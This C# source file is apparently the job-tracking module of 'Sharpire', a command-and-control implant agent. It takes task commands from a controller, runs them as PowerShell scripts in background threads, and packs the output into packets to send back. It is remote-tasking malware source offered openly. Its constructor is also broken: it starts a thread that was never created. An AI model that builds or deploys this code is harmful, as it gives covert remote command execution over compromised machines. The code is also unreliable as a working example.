using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading;

namespace Sharpire
{
    public class JobTracking
    {
        public Dictionary<string, Job> jobs;
        public Dictionary<string, ushort> jobsId;
        public byte[] ImportedScript { get; set; }

        public JobTracking()
        {
            jobs = new Dictionary<string, Job>();
            jobsId = new Dictionary<string, ushort>();
        }

        internal void CheckAgentJobs(ref byte[] packets, ref Coms coms)
        {
            lock (jobs)
            {
                List<string> jobsToRemove = new List<string>();
                foreach (KeyValuePair<string, Job> job in jobs)
                {
                    string results = "";
                    if (job.Value.IsCompleted())
                    {
                        try
                        {
                            results = job.Value.GetOutput();
                            job.Value.KillThread();
                            job.Value.Status = "stopped";
                        }
                        catch (NullReferenceException) { }

                        jobsToRemove.Add(job.Key);
                        packets = Misc.combine(packets, coms.EncodePacket(110, results, jobsId[job.Key]));
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
        }

        internal byte[] GetAgentJobsOutput(ref Coms coms)
        {
            byte[] jobResults = new byte[0];
            lock (jobs)
            {
                List<string> jobsToRemove = new List<string>();
                foreach (string jobName in jobs.Keys)
                {
                    string results = "";
                    if (jobs[jobName].IsCompleted())
                    {
                        try
                        {
                            results = jobs[jobName].GetOutput();
                            jobs[jobName].KillThread();
                            jobs[jobName].Status = "stopped";
                        }
                        catch (NullReferenceException) { }
                        jobsToRemove.Add(jobName);
                    }
                    else if (jobs[jobName].Status == "running")
                    {
                        results = jobs[jobName].GetOutput();
                    }

                    if (0 < results.Length)
                    {
                        jobResults = Misc.combine(jobResults, coms.EncodePacket(110, results, jobsId[jobName]));
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
            return jobResults;
        }

        internal void StartAgentJob(string command, ushort taskId)
        {
            string taskIdString = taskId.ToString();
            lock (jobs)
            {
                if (jobs.ContainsKey(taskIdString))
                {
                    jobs[taskIdString].UpdateCommand(command);
                }
                else
                {
                    jobs.Add(taskIdString, new Job(command));
                }
            }
            lock (jobsId)
            {
                if (!jobsId.ContainsKey(taskIdString))
                {
                    jobsId.Add(taskIdString, taskId);
                }
            }
        }

        public class Job
        {
            private Thread JobThread { get; set; }
            private string output = "";
            private bool isFinished = false;
            public string Status { get; set; }
            public string Language { get; set; }
            public Thread Thread { get; set; }
            public PowershellDetails Powershell { get; set; }
            private readonly object syncLock = new object();
            private string command;


            public Job()
            {
                // Default constructor for initialization
            }

            public Job(string command)
            {
                Status = "running";
                this.command = command;
                JobThread.Start();
            }

            private void StartJob()
            {
                JobThread = new Thread(() => RunPowerShell(command));
                JobThread.Start();
            }

            public void UpdateCommand(string newCommand)
            {
                lock (syncLock)
                {
                    // Update the command
                    command = newCommand;

                    // Restart the job
                    if (JobThread != null && JobThread.IsAlive)
                    {
                        JobThread.Abort();
                    }
                    StartJob();
                }
            }

            public void RunPowerShell(string command)
            {
                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();

                    using (Pipeline pipeline = runspace.CreatePipeline())
                    {
                        pipeline.Commands.AddScript(command);
                        pipeline.Commands.Add("Out-String");

                        StringBuilder sb = new StringBuilder();
                        try
                        {
                            Collection<PSObject> results = pipeline.Invoke();
                            foreach (PSObject obj in results)
                            {
                                sb.Append(obj.ToString());
                            }
                        }
                        catch (ParameterBindingException error)
                        {
                            sb.Append("[-] ParameterBindingException: " + error.Message);
                        }
                        catch (CmdletInvocationException error)
                        {
                            sb.Append("[-] CmdletInvocationException: " + error.Message);
                        }
                        catch (RuntimeException error)
                        {
                            sb.Append("[-] RuntimeException: " + error.Message);
                        }
                        finally
                        {
                            lock (syncLock)
                            {
                                output = sb.ToString();
                                isFinished = true;
                            }
                        }
                    }
                }
            }

            public bool IsCompleted()
            {
                lock (syncLock)
                {
                    if (JobThread != null)
                    {
                        if (isFinished)
                        {
                            Status = "completed";
                            return true;
                        }
                        return false;
                    }
                    else
                    {
                        Status = "completed";
                        return true;
                    }
                }
            }

            public string GetOutput()
            {
                lock (syncLock)
                {
                    return output;
                }
            }

            public void KillThread()
            {
                if (JobThread != null)
                {
                    JobThread.Abort();
                    Status = "stopped";
                }
            }
        }

        public class PowershellDetails
        {
            public object AppDomain { get; set; }
            public object PsHost { get; set; }
            public object Buffer { get; set; }
            public object PsHostExec { get; set; }
        }
    }
}
